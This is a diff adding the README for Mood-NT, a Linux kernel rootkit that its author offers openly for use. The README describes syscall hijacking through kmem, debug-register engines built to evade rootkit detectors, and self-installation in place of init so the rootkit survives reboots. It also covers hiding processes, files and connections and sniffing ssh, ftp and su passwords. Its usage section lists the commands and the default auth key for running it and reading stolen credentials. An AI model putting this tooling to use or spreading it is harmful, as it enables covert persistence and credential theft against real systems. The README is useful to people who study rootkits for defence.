@@ -1,0 +1,134 @@
+MOOD-NT's README FILE
+
+
+- Intro
+- Design
+- Features
+- Requirements
+- Installing
+- Using
+- Uninstalling
+- Thanks
+
+
+------------------------------------------
+INTRO
+------------------------------------------
+As I got inspired by great codes such as 'suckits' by sd, some year ago I decided to write Mood-NT.
+The first working alpha was in 2003... duh, i'm a lazy coder :P
+I've added some features, powered or fixed up things and i gave it some new
+singin' and dancin' hiding engines to enhance portability and stealthness.
+Mood-NT worked on every kernel i've ever tested, from 2.4.0 to 2.6.19, auto
+adapting itself through various reboots with different kernels, so at least
+portability is achieved I'd say :-)
+
+The most interesting hiding engine inside Mood-NT is imho the debug
+registers engine, that turns Mood-NT into a "dito nel culo" - (tr: "pain in the ass") as people say in my country - and make it hard to detect. Actually never got the chance to see any (public) similar tool so, since nowadays people seem to be interested in tools like this one, I decided it was time to release it and here it is. 
+The possible enhancements are many, for example instead of syscall_call we could break on system_call, it will be cheaper of one breakpoint in 2.4 legacy mode,
+anyway, when I thought to implement such features or checked similar solutions in other codes it was too late, as I was done with that portion of code.. or I simply was too lazy :)
+
+So consider this as a present.. and if you really can't live without such pretty features, you can either pay me for coding them or code them by yourselves :P
+
+In conclusion, whoever you are I hope you'll find this code useful.
+
+
+------------------------------------------
+DESIGN
+------------------------------------------
+Quite simple. It's a kmem rk that works hijacking every syscall that can show using our hidden data. It can work in 3 modes:
+
+* standard: 	simple syscall hijacking
+* 2.4 legacy: 	dbrs engine is active, but without FULL invisibility because we
+		cannot dinamically register our handler
+* elite mode:	full working dbrs hiding engine
+
+Mood NT makes sure to activate after reboot by auto-installing itself instead of real init. It does also protect itself through access redirections to real init.
+
+It has a lot of anti-detectors check and fixes, such as process comm rewrite, /proc/maps - cmdline mangling and so on.
+Once activated it changes its behaviours/checks depending on the activation mode.
+The activation mode is automatically chosen based on the host's characteristics, but can be forced with the proper command line.
+
+The auth-key is an user chosen number between 0 and 0xffffffff; once
+authenticated, root privileges are given and the client's caller process becomes hidden/authorized. (example, the shell)
+
+------------------------------------------
+FEATURES
+------------------------------------------
+It:
+- auto (SELF) install via kmem
+- hides connections
+- hides connections through netlink
+- features file hijacking (exec and files related operations)
+- hides promisc flag and printks
+- hides processes
+- sniffs interesting data of interesting programs (ssh, ftp, su...) like user, password and so on
+- is very portable, it works through 2.4.x to 2.6.x (tested till 16)
+- hides files
+- has a password authentication
+- has a user-chosen basedir
+- is a local backdoor
+- has an its own init script
+- hides itself against detectors with 3 different engines
+- does NOT have a remote backdoor (no interests in coding things like that inside mood-nt, go and put your favourite backdoor into mood-nt's basedir/initscript if you really want it)
+
+
+------------------------------------------
+REQUIREMENTS
+------------------------------------------
+
+dietlibc is required to compile 
+
+------------------------------------------
+INSTALLING
+------------------------------------------
+simply with ./mood-nt -d for standard install with standard password and symbols parsers, -h for the help
+
+------------------------------------------
+USING
+------------------------------------------
+
+Examples:
+
+- Authenticate with:
+
+  ./mood-nt -A 0xyourkey (default 0xbadc0ded)
+
+- Hide a process
+
+ ./mood-nt -H pidnumber
+
+- Hide a directory
+
+ ./mood-nt -F /tmp
+
+- Customize our init script (in our default dir)
+
+ echo "echo \"Hello world\"" >> /_cthulhu/mood-nt.init
+
+- Watch sniffed data
+
+ cat /_cthulhu/mood-nt.sniff
+
+------------------------------------------
+UNINSTALLING
+------------------------------------------
+- Authenticate with:
+
+  ./mood-nt -A 0xyourkey (default 0xbadc0ded)
+
+- Deactivate it:
+
+  ./mood-nt -R
+
+- Remove user-chosen basedir
+ 
+  rm -rf :-)
+
+
+------------------------------------------
+THANKS
+------------------------------------------
+Thanks to all Antifork people, in a special way sgrakkyu and twiz, and to Attilio, Michele, Angelo, Daniele, Roberto for interesting talks, suggestions, hints, codes and invasive beta testings.
+Thanks to all the great coders whose codes or ideas have deeply inspired my work
+, in a special way sd's suckits. 
+
